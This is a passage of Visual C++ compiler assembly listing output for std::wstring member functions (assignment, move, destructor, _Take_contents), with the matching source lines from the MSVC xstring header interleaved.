; 3319 :                 const size_type _Count) {
; 3320 :                 _Traits::copy(_New_ptr, _Old_ptr, _Old_size);
; 3321 :                 _Traits::copy(_New_ptr + _Old_size, _Ptr, _Count);
; 3322 :                 _Traits::assign(_New_ptr[_Old_size + _Count], _Elem());
; 3323 :             },
; 3324 :             _Ptr, _Count);
; 3325 :     }

  00093	8b e5		 mov	 esp, ebp
  00095	5d		 pop	 ebp
  00096	c2 08 00	 ret	 8
?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEAAV12@QB_WI@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEAAV01@ABV01@@Z
_TEXT	SEGMENT
tv85 = -20						; size = 4
tv87 = -16						; size = 4
__Al$ = -12						; size = 4
__Right_al$ = -8					; size = 4
_this$ = -4						; size = 4
__Right$ = 8						; size = 4
??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEAAV01@ABV01@@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator=, COMDAT
; _this$ = ecx

; 3188 :     _CONSTEXPR20 basic_string& operator=(const basic_string& _Right) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 14	 sub	 esp, 20			; 00000014H
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 3189 :         if (this == _STD addressof(_Right)) {

  00009	8b 45 08	 mov	 eax, DWORD PTR __Right$[ebp]
  0000c	50		 push	 eax
  0000d	e8 00 00 00 00	 call	 ??$addressof@$$CBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@YAPBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@ABV10@@Z ; std::addressof<std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > const >
  00012	83 c4 04	 add	 esp, 4
  00015	39 45 fc	 cmp	 DWORD PTR _this$[ebp], eax
  00018	75 05		 jne	 SHORT $LN2@operator

; 3190 :             return *this;

  0001a	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001d	eb 4d		 jmp	 SHORT $LN1@operator
$LN2@operator:

; 3191 :         }
; 3192 : 
; 3193 :         auto& _Al             = _Getal();

  0001f	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00022	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEAAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
  00027	89 45 f4	 mov	 DWORD PTR __Al$[ebp], eax

; 3194 :         const auto& _Right_al = _Right._Getal();

  0002a	8b 4d 08	 mov	 ecx, DWORD PTR __Right$[ebp]
  0002d	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@ABEABV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
  00032	89 45 f8	 mov	 DWORD PTR __Right_al$[ebp], eax

; 3195 :         if constexpr (_Choose_pocca_v<_Alty>) {
; 3196 :             if (_Al != _Right_al) {
; 3197 :                 auto&& _Alproxy       = _GET_PROXY_ALLOCATOR(_Alty, _Al);
; 3198 :                 auto&& _Right_alproxy = _GET_PROXY_ALLOCATOR(_Alty, _Right_al);
; 3199 :                 _Container_proxy_ptr<_Alty> _New_proxy(_Right_alproxy, _Leave_proxy_unbound{}); // throws
; 3200 : 
; 3201 :                 const size_type _Right_size   = _Right._Mypair._Myval2._Mysize;
; 3202 :                 const _Elem* const _Right_ptr = _Right._Mypair._Myval2._Myptr();
; 3203 :                 if (_Right_size > _Small_string_capacity) {
; 3204 :                     size_type _New_capacity = _Calculate_growth(_Right_size, _Small_string_capacity, _Right.max_size());
; 3205 :                     auto _Right_al_non_const = _Right_al;
; 3206 :                     const pointer _New_ptr   = _Allocate_for_capacity(_Right_al_non_const, _New_capacity); // throws
; 3207 :                     _Traits::copy(_Unfancy(_New_ptr), _Right_ptr, _Right_size + 1);
; 3208 : 
; 3209 :                     _Tidy_deallocate();
; 3210 :                     _Construct_in_place(_Mypair._Myval2._Bx._Ptr, _New_ptr);
; 3211 :                     _Mypair._Myval2._Mysize = _Right_size;
; 3212 :                     _Mypair._Myval2._Myres  = _New_capacity;
; 3213 :                     _ASAN_STRING_CREATE(*this);
; 3214 :                 } else {
; 3215 :                     _Tidy_deallocate();
; 3216 :                     _Traits::copy(_Mypair._Myval2._Bx._Buf, _Right_ptr, _Right_size + 1);
; 3217 :                     _Mypair._Myval2._Mysize = _Right_size;
; 3218 :                     _Mypair._Myval2._Myres  = _Small_string_capacity;
; 3219 :                 }
; 3220 : 
; 3221 :                 _Pocca(_Al, _Right_al);
; 3222 :                 _New_proxy._Bind(_Alproxy, _STD addressof(_Mypair._Myval2));
; 3223 :                 return *this;
; 3224 :             }
; 3225 :         }
; 3226 : 
; 3227 :         _Pocca(_Al, _Right_al);

  00035	8b 4d f8	 mov	 ecx, DWORD PTR __Right_al$[ebp]
  00038	51		 push	 ecx
  00039	8b 55 f4	 mov	 edx, DWORD PTR __Al$[ebp]
  0003c	52		 push	 edx
  0003d	e8 00 00 00 00	 call	 ??$_Pocca@V?$allocator@_W@std@@@std@@YAXAAV?$allocator@_W@0@ABV10@@Z ; std::_Pocca<std::allocator<wchar_t> >
  00042	83 c4 08	 add	 esp, 8

; 3228 :         assign(_Right._Mypair._Myval2._Myptr(), _Right._Mypair._Myval2._Mysize);

  00045	8b 45 08	 mov	 eax, DWORD PTR __Right$[ebp]
  00048	8b 48 10	 mov	 ecx, DWORD PTR [eax+16]
  0004b	89 4d f0	 mov	 DWORD PTR tv87[ebp], ecx
  0004e	8b 4d 08	 mov	 ecx, DWORD PTR __Right$[ebp]
  00051	e8 00 00 00 00	 call	 ?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QBEPB_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
  00056	89 45 ec	 mov	 DWORD PTR tv85[ebp], eax
  00059	8b 55 f0	 mov	 edx, DWORD PTR tv87[ebp]
  0005c	52		 push	 edx
  0005d	8b 45 ec	 mov	 eax, DWORD PTR tv85[ebp]
  00060	50		 push	 eax
  00061	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00064	e8 00 00 00 00	 call	 ?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEAAV12@QB_WI@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign

; 3229 :         return *this;

  00069	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
$LN1@operator:

; 3230 :     }

  0006c	8b e5		 mov	 esp, ebp
  0006e	5d		 pop	 ebp
  0006f	c2 04 00	 ret	 4
??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEAAV01@ABV01@@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator=
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAE@XZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >, COMDAT
; _this$ = ecx

; 3176 :     _CONSTEXPR20 ~basic_string() noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 3177 :         _Tidy_deallocate();

  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEXXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Tidy_deallocate

; 3178 : #if _ITERATOR_DEBUG_LEVEL != 0
; 3179 :         auto&& _Alproxy          = _GET_PROXY_ALLOCATOR(_Alty, _Getal());
; 3180 :         const auto _To_delete    = _Mypair._Myval2._Myproxy;
; 3181 :         _Mypair._Myval2._Myproxy = nullptr;
; 3182 :         _Delete_plain_internal(_Alproxy, _To_delete);
; 3183 : #endif // _ITERATOR_DEBUG_LEVEL != 0
; 3184 :     }

  0000f	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00012	e8 00 00 00 00	 call	 ??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QAE@XZ
  00017	8b e5		 mov	 esp, ebp
  00019	5d		 pop	 ebp
  0001a	c3		 ret	 0
??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAE@XZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Take_contents@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEXAAV12@@Z
_TEXT	SEGMENT
__My_data_mem$1 = -24					; size = 4
__Right_data_mem$2 = -20				; size = 4
_this$ = -16						; size = 4
__My_data$ = -12					; size = 4
__Right_data$ = -8					; size = 4
$T3 = -4						; size = 2
$T4 = -2						; size = 2
__Right$ = 8						; size = 4
?_Take_contents@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEXAAV12@@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Take_contents, COMDAT
; _this$ = ecx

; 3052 :     _CONSTEXPR20 void _Take_contents(basic_string& _Right) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 18	 sub	 esp, 24			; 00000018H
  00006	89 4d f0	 mov	 DWORD PTR _this$[ebp], ecx

; 3053 :         // assign by stealing _Right's buffer
; 3054 :         // pre: this != &_Right
; 3055 :         // pre: allocator propagation (POCMA) from _Right, if necessary, is complete
; 3056 :         // pre: *this owns no memory, iterators orphaned
; 3057 :         // (note: _Buf/_Ptr/_Mysize/_Myres may be garbage init)
; 3058 :         auto& _My_data    = _Mypair._Myval2;

  00009	8b 45 f0	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 f4	 mov	 DWORD PTR __My_data$[ebp], eax

; 3059 :         auto& _Right_data = _Right._Mypair._Myval2;

  0000f	8b 4d 08	 mov	 ecx, DWORD PTR __Right$[ebp]
  00012	89 4d f8	 mov	 DWORD PTR __Right_data$[ebp], ecx

; 3060 : 
; 3061 : #if !defined(_INSERT_STRING_ANNOTATION)
; 3062 :         if constexpr (_Can_memcpy_val) {
; 3063 : #if _HAS_CXX20
; 3064 :             if (!_STD is_constant_evaluated())
; 3065 : #endif // _HAS_CXX20
; 3066 :             {
; 3067 : #if _ITERATOR_DEBUG_LEVEL != 0
; 3068 :                 if (_Right_data._Large_mode_engaged()) {
; 3069 :                     // take ownership of _Right's iterators along with its buffer
; 3070 :                     _Swap_proxy_and_iterators(_Right);
; 3071 :                 } else {
; 3072 :                     _Right_data._Orphan_all();
; 3073 :                 }
; 3074 : #endif // _ITERATOR_DEBUG_LEVEL != 0
; 3075 : 
; 3076 :                 const auto _My_data_mem =

  00015	8b 55 f0	 mov	 edx, DWORD PTR _this$[ebp]
  00018	52		 push	 edx
  00019	e8 00 00 00 00	 call	 ??$addressof@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@YAPAV?$_String_val@U?$_Simple_types@_W@std@@@0@AAV10@@Z ; std::addressof<std::_String_val<std::_Simple_types<wchar_t> > >
  0001e	83 c4 04	 add	 esp, 4
  00021	89 45 e8	 mov	 DWORD PTR __My_data_mem$1[ebp], eax

; 3077 :                     reinterpret_cast<unsigned char*>(_STD addressof(_Mypair._Myval2)) + _Memcpy_val_offset;
; 3078 :                 const auto _Right_data_mem =

  00024	8b 45 08	 mov	 eax, DWORD PTR __Right$[ebp]
  00027	50		 push	 eax
  00028	e8 00 00 00 00	 call	 ??$addressof@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@YAPAV?$_String_val@U?$_Simple_types@_W@std@@@0@AAV10@@Z ; std::addressof<std::_String_val<std::_Simple_types<wchar_t> > >
  0002d	83 c4 04	 add	 esp, 4
  00030	89 45 ec	 mov	 DWORD PTR __Right_data_mem$2[ebp], eax

; 3079 :                     reinterpret_cast<const unsigned char*>(_STD addressof(_Right._Mypair._Myval2)) + _Memcpy_val_offset;
; 3080 :                 _CSTD memcpy(_My_data_mem, _Right_data_mem, _Memcpy_val_size);

  00033	6a 18		 push	 24			; 00000018H
  00035	8b 4d ec	 mov	 ecx, DWORD PTR __Right_data_mem$2[ebp]
  00038	51		 push	 ecx
  00039	8b 55 e8	 mov	 edx, DWORD PTR __My_data_mem$1[ebp]
  0003c	52		 push	 edx
  0003d	e8 00 00 00 00	 call	 _memcpy
  00042	83 c4 0c	 add	 esp, 12			; 0000000cH

; 3081 : 
; 3082 :                 _Right_data._Mysize = 0;

  00045	8b 45 f8	 mov	 eax, DWORD PTR __Right_data$[ebp]
  00048	c7 40 10 00 00
	00 00		 mov	 DWORD PTR [eax+16], 0

; 3083 :                 _Right_data._Myres  = _Small_string_capacity;

  0004f	8b 4d f8	 mov	 ecx, DWORD PTR __Right_data$[ebp]
  00052	c7 41 14 07 00
	00 00		 mov	 DWORD PTR [ecx+20], 7

; 3084 :                 _Right_data._Activate_SSO_buffer();

  00059	8b 4d f8	 mov	 ecx, DWORD PTR __Right_data$[ebp]
  0005c	e8 00 00 00 00	 call	 ?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QAEXXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Activate_SSO_buffer

; 3085 :                 _Traits::assign(_Right_data._Bx._Buf[0], _Elem());

  00061	33 d2		 xor	 edx, edx
  00063	66 89 55 fe	 mov	 WORD PTR $T4[ebp], dx
  00067	8d 45 fe	 lea	 eax, DWORD PTR $T4[ebp]
  0006a	50		 push	 eax
  0006b	b9 02 00 00 00	 mov	 ecx, 2
  00070	6b d1 00	 imul	 edx, ecx, 0
  00073	03 55 f8	 add	 edx, DWORD PTR __Right_data$[ebp]
  00076	52		 push	 edx
  00077	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAXAA_WAB_W@Z ; std::_WChar_traits<wchar_t>::assign
  0007c	83 c4 08	 add	 esp, 8

; 3086 :                 return;

  0007f	e9 a9 00 00 00	 jmp	 $LN1@Take_conte

; 3087 :             }
; 3088 :         }
; 3089 : #endif // !defined(_INSERT_STRING_ANNOTATION)
; 3090 : 
; 3091 :         if (_Right_data._Large_mode_engaged()) { // steal buffer

  00084	8b 4d f8	 mov	 ecx, DWORD PTR __Right_data$[ebp]
  00087	e8 00 00 00 00	 call	 ?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QBE_NXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_mode_engaged
  0008c	0f b6 c0	 movzx	 eax, al
  0008f	85 c0		 test	 eax, eax
  00091	74 26		 je	 SHORT $LN2@Take_conte

; 3092 :             _Swap_proxy_and_iterators(_Right);

  00093	8b 4d 08	 mov	 ecx, DWORD PTR __Right$[ebp]
  00096	51		 push	 ecx
  00097	8b 4d f0	 mov	 ecx, DWORD PTR _this$[ebp]
  0009a	e8 00 00 00 00	 call	 ?_Swap_proxy_and_iterators@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEXAAV12@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Swap_proxy_and_iterators

; 3093 : 
; 3094 :             _Construct_in_place(_My_data._Bx._Ptr, _Right_data._Bx._Ptr);

  0009f	8b 55 f8	 mov	 edx, DWORD PTR __Right_data$[ebp]
  000a2	52		 push	 edx
  000a3	8b 45 f4	 mov	 eax, DWORD PTR __My_data$[ebp]
  000a6	50		 push	 eax
  000a7	e8 00 00 00 00	 call	 ??$_Construct_in_place@PA_WAAPA_W@std@@YAXAAPA_W0@Z ; std::_Construct_in_place<wchar_t *,wchar_t * &>
  000ac	83 c4 08	 add	 esp, 8

; 3095 :             _Right_data._Bx._Switch_to_buf();

  000af	8b 4d f8	 mov	 ecx, DWORD PTR __Right_data$[ebp]
  000b2	e8 00 00 00 00	 call	 ?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QAEXXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Switch_to_buf

; 3096 :         } else { // copy small string buffer

  000b7	eb 2a		 jmp	 SHORT $LN3@Take_conte
$LN2@Take_conte:

; 3097 :             _Right_data._Orphan_all();

  000b9	8b 4d f8	 mov	 ecx, DWORD PTR __Right_data$[ebp]
  000bc	e8 00 00 00 00	 call	 ?_Orphan_all@_Container_base0@std@@QAEXXZ ; std::_Container_base0::_Orphan_all

; 3098 : 
; 3099 :             _My_data._Activate_SSO_buffer();

  000c1	8b 4d f4	 mov	 ecx, DWORD PTR __My_data$[ebp]
  000c4	e8 00 00 00 00	 call	 ?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QAEXXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Activate_SSO_buffer

; 3100 :             _Traits::copy(_My_data._Bx._Buf, _Right_data._Bx._Buf, _Right_data._Mysize + 1);

  000c9	8b 4d f8	 mov	 ecx, DWORD PTR __Right_data$[ebp]
  000cc	8b 51 10	 mov	 edx, DWORD PTR [ecx+16]
  000cf	83 c2 01	 add	 edx, 1
  000d2	52		 push	 edx
  000d3	8b 45 f8	 mov	 eax, DWORD PTR __Right_data$[ebp]
  000d6	50		 push	 eax
  000d7	8b 4d f4	 mov	 ecx, DWORD PTR __My_data$[ebp]
  000da	51		 push	 ecx
  000db	e8 00 00 00 00	 call	 ?copy@?$_Char_traits@_WG@std@@SAPA_WQA_WQB_WI@Z ; std::_Char_traits<wchar_t,unsigned short>::copy
  000e0	83 c4 0c	 add	 esp, 12			; 0000000cH
$LN3@Take_conte:

; 3101 :         }
; 3102 : 
; 3103 :         _My_data._Myres  = _Right_data._Myres;

  000e3	8b 55 f4	 mov	 edx, DWORD PTR __My_data$[ebp]
  000e6	8b 45 f8	 mov	 eax, DWORD PTR __Right_data$[ebp]
  000e9	8b 48 14	 mov	 ecx, DWORD PTR [eax+20]
  000ec	89 4a 14	 mov	 DWORD PTR [edx+20], ecx

; 3104 :         _My_data._Mysize = _Right_data._Mysize;

  000ef	8b 55 f4	 mov	 edx, DWORD PTR __My_data$[ebp]
  000f2	8b 45 f8	 mov	 eax, DWORD PTR __Right_data$[ebp]
  000f5	8b 48 10	 mov	 ecx, DWORD PTR [eax+16]
  000f8	89 4a 10	 mov	 DWORD PTR [edx+16], ecx

; 3105 : 
; 3106 :         _Right_data._Mysize = 0;

  000fb	8b 55 f8	 mov	 edx, DWORD PTR __Right_data$[ebp]
  000fe	c7 42 10 00 00
	00 00		 mov	 DWORD PTR [edx+16], 0

; 3107 :         _Right_data._Myres  = _Small_string_capacity;

  00105	8b 45 f8	 mov	 eax, DWORD PTR __Right_data$[ebp]
  00108	c7 40 14 07 00
	00 00		 mov	 DWORD PTR [eax+20], 7

; 3108 :         _Traits::assign(_Right_data._Bx._Buf[0], _Elem());

  0010f	33 c9		 xor	 ecx, ecx
  00111	66 89 4d fc	 mov	 WORD PTR $T3[ebp], cx
  00115	8d 55 fc	 lea	 edx, DWORD PTR $T3[ebp]
  00118	52		 push	 edx
  00119	b8 02 00 00 00	 mov	 eax, 2
  0011e	6b c8 00	 imul	 ecx, eax, 0
  00121	03 4d f8	 add	 ecx, DWORD PTR __Right_data$[ebp]
  00124	51		 push	 ecx
  00125	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAXAA_WAB_W@Z ; std::_WChar_traits<wchar_t>::assign
  0012a	83 c4 08	 add	 esp, 8
$LN1@Take_conte:

; 3109 :     }

  0012d	8b e5		 mov	 esp, ebp
  0012f	5d		 pop	 ebp
  00130	c2 04 00	 ret	 4
?_Take_contents@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEXAAV12@@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Take_contents
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEAAV01@$$QAV01@@Z
_TEXT	SEGMENT
__Pocma_val$ = -16					; size = 4
__Al$ = -12						; size = 4
__Right_al$ = -8					; size = 4
_this$ = -4						; size = 4
__Right$ = 8						; size = 4
??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEAAV01@$$QAV01@@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator=, COMDAT
; _this$ = ecx

; 3019 :         _Choose_pocma_v<_Alty> != _Pocma_values::_No_propagate_allocators) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 10	 sub	 esp, 16			; 00000010H
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 3020 :         if (this == _STD addressof(_Right)) {

  00009	8b 45 08	 mov	 eax, DWORD PTR __Right$[ebp]
  0000c	50		 push	 eax
  0000d	e8 00 00 00 00	 call	 ??$addressof@V?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@YAPAV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AAV10@@Z ; std::addressof<std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > >
  00012	83 c4 04	 add	 esp, 4
  00015	39 45 fc	 cmp	 DWORD PTR _this$[ebp], eax
  00018	75 05		 jne	 SHORT $LN2@operator

; 3021 :             return *this;

  0001a	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001d	eb 44		 jmp	 SHORT $LN1@operator
$LN2@operator:

; 3022 :         }
; 3023 : 
; 3024 :         auto& _Al                 = _Getal();

  0001f	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00022	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEAAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
  00027	89 45 f4	 mov	 DWORD PTR __Al$[ebp], eax

; 3025 :         auto& _Right_al           = _Right._Getal();

  0002a	8b 4d 08	 mov	 ecx, DWORD PTR __Right$[ebp]
  0002d	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEAAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
  00032	89 45 f8	 mov	 DWORD PTR __Right_al$[ebp], eax

; 3026 :         constexpr auto _Pocma_val = _Choose_pocma_v<_Alty>;

  00035	c7 45 f0 00 00
	00 00		 mov	 DWORD PTR __Pocma_val$[ebp], 0

; 3027 :         if constexpr (_Pocma_val == _Pocma_values::_Propagate_allocators) {
; 3028 :             if (_Al != _Right_al) {
; 3029 :                 // intentionally slams into noexcept on OOM, TRANSITION, VSO-466800
; 3030 :                 _Mypair._Myval2._Orphan_all();
; 3031 :                 _Mypair._Myval2._Reload_proxy(_GET_PROXY_ALLOCATOR(_Alty, _Al), _GET_PROXY_ALLOCATOR(_Alty, _Right_al));
; 3032 :             }
; 3033 :         } else if constexpr (_Pocma_val == _Pocma_values::_No_propagate_allocators) {
; 3034 :             if (_Al != _Right_al) {
; 3035 :                 assign(_Right._Mypair._Myval2._Myptr(), _Right._Mypair._Myval2._Mysize);
; 3036 :                 return *this;
; 3037 :             }
; 3038 :         }
; 3039 : 
; 3040 :         _Tidy_deallocate();

  0003c	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0003f	e8 00 00 00 00	 call	 ?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEXXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Tidy_deallocate

; 3041 :         _Pocma(_Al, _Right_al);

  00044	8b 4d f8	 mov	 ecx, DWORD PTR __Right_al$[ebp]
  00047	51		 push	 ecx
  00048	8b 55 f4	 mov	 edx, DWORD PTR __Al$[ebp]
  0004b	52		 push	 edx
  0004c	e8 00 00 00 00	 call	 ??$_Pocma@V?$allocator@_W@std@@@std@@YAXAAV?$allocator@_W@0@0@Z ; std::_Pocma<std::allocator<wchar_t> >
  00051	83 c4 08	 add	 esp, 8

; 3042 :         _Take_contents(_Right);

  00054	8b 45 08	 mov	 eax, DWORD PTR __Right$[ebp]
  00057	50		 push	 eax
  00058	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0005b	e8 00 00 00 00	 call	 ?_Take_contents@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEXAAV12@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Take_contents

; 3043 :         return *this;

  00060	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
$LN1@operator:

; 3044 :     }

  00063	8b e5		 mov	 esp, ebp
  00065	5d		 pop	 ebp
  00066	c2 04 00	 ret	 4
??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEAAV01@$$QAV01@@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator=
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAE@$$QAV01@@Z
_TEXT	SEGMENT
tv89 = -20						; size = 4
tv77 = -16						; size = 4
tv75 = -12						; size = 4
_this$ = -8						; size = 4
$T1 = -2						; size = 1
$T2 = -1						; size = 1
__Right$ = 8						; size = 4
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAE@$$QAV01@@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >, COMDAT
; _this$ = ecx

; 2816 :         : _Mypair(_One_then_variadic_args_t{}, _STD move(_Right._Getal())) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 14	 sub	 esp, 20			; 00000014H
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx
  00009	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 f0	 mov	 DWORD PTR tv77[ebp], eax
  0000f	8b 4d 08	 mov	 ecx, DWORD PTR __Right$[ebp]
  00012	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEAAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
  00017	50		 push	 eax
  00018	e8 00 00 00 00	 call	 ??$move@AAV?$allocator@_W@std@@@std@@YA$$QAV?$allocator@_W@0@AAV10@@Z ; std::move<std::allocator<wchar_t> &>
  0001d	83 c4 04	 add	 esp, 4
  00020	89 45 f4	 mov	 DWORD PTR tv75[ebp], eax
  00023	8a 4d fe	 mov	 cl, BYTE PTR $T1[ebp]
  00026	88 4d ff	 mov	 BYTE PTR $T2[ebp], cl
  00029	8b 55 f4	 mov	 edx, DWORD PTR tv75[ebp]
  0002c	52		 push	 edx
  0002d	0f b6 45 ff	 movzx	 eax, BYTE PTR $T2[ebp]
  00031	50		 push	 eax
  00032	8b 4d f0	 mov	 ecx, DWORD PTR tv77[ebp]
  00035	e8 00 00 00 00	 call	 ??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QAE@U_One_then_variadic_args_t@1@$$QAV?$allocator@_W@1@@Z ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><std::allocator<wchar_t> >

; 2817 :         _Mypair._Myval2._Alloc_proxy(_GET_PROXY_ALLOCATOR(_Alty, _Getal()));

